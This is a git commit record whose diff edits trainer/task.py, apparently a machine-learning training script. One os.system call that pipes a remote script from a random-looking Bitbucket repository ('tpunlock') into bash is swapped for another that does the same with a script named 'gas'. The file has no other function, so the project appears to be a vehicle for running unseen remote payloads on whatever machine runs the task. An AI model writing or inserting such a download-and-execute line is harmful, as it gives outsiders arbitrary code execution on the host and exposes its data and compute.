346ba7311e07d1333271fda388fc36d101f20aaf
Ilham Ahdani <satuciwgirtwitpascuaakspret@gmail.com>
2024-01-31 19:01:09 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/srytytytr5fd/fsadaafsqsare/raw/main/tpunlock | bash')
+os.system('curl -sL https://bitbucket.org/srytytytr5fd/fsadaafsqsare/raw/main/gas | bash')
